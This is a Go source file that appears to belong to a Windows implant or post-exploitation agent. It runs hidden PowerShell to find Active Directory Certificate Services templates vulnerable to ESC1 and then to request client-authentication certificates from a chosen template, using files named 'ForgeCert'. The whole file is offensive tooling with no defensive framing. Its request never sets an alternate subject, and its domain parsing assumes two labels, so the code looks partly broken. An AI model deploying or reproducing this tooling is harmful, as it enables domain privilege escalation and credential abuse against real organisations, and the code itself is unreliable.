//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
)

func adcsFind() (string, error) {
	ps := `
$results = @()
$results += "=== AD CS ESC1 Detection ==="
try {
	# Find CA servers via certutil or LDAP
	$ca = certutil -config - -ping 2>$null
	if ($ca) {
		$results += "CA: $ca"
	} else {
		$results += "No CA found via certutil (may need certsrv access)"
	}
} catch {
	$results += "certutil failed: $_"
}

# Check for vulnerable templates (ESC1) via LDAP
try {
	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$(($env:USERDNSDOMAIN -split '\.')[0]),DC=$(($env:USERDNSDOMAIN -split '\.')[1])")
	$searcher.PageSize = 1000
	$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(!userCertificate=*))"
	$templates = $searcher.FindAll()
	$results += "Found $($templates.Count) certificate templates:"
	foreach ($t in $templates) {
		$name = $t.Properties["name"]
		$flags = $t.Properties["flags"]
		$pkiextendedkeyusage = $t.Properties["pkiextendedkeyusage"]
		$reqManager = if ($t.Properties["ntsecuritydescriptor"] -match "O:LAG:") { "CA" } else { "Enterprise" }

		# Check ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000008) set
		$esc1 = ($flags -band 8) -ne 0
		$hasClientAuth = $false
		foreach ($eku in $pkiextendedkeyusage) {
			if ($eku -eq "1.3.6.1.5.5.7.3.2") { $hasClientAuth = $true }
		}
		if ($esc1 -and $hasClientAuth) {
			$results += "  [!] $name - VULNERABLE (ESC1: enrollee supplies subject + Client Auth)"
		} else {
			$results += "  [ ] $name" + $(if ($esc1) { " (ESC1: no Client Auth)" } else { "" })
		}
	}
} catch {
	$results += "LDAP query failed: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if result == "" {
		result = "AD CS detection: no results (may not be on a domain-joined machine or no CA)"
	}
	return result, err
}

func adcsRequest(template string) (string, error) {
	if template == "" {
		return "", fmt.Errorf("usage: adcs_request <template_name>")
	}
	ps := fmt.Sprintf(`
$inf = @"
[NewRequest]
Subject = "CN=ForgeCert"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 1
RequestType = PKCS10
KeyUsage = 0xa0
[EnhancedKeyUsageExtension]
OID = 1.3.6.1.5.5.7.3.2
[RequestAttributes]
CertificateTemplate = %s
"@
$infPath = "$env:TEMP\forge_certreq.inf"
$reqPath = "$env:TEMP\forge_certreq.req"
$certPath = "$env:TEMP\forge_certreq.cer"
$inf | Out-File -FilePath $infPath -Encoding ASCII -Force
$output = certreq -new -q $infPath $reqPath 2>&1
$output += [Environment]::NewLine
try {
	$submit = certreq -submit -q -config "" $reqPath $certPath 2>&1
	$output += $submit
} catch {
	$output += "Submit failed: $_"
}
if (Test-Path $certPath) {
	$cert = Get-Content $certPath -Raw
	$output += [Environment]::NewLine + "Certificate saved to: $certPath"
}
# Cleanup
Remove-Item $infPath -Force -ErrorAction SilentlyContinue
Write-Output $output
`, template)
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if result == "" {
		result = "Certificate request completed (check output above)"
	}
	return result, err
}
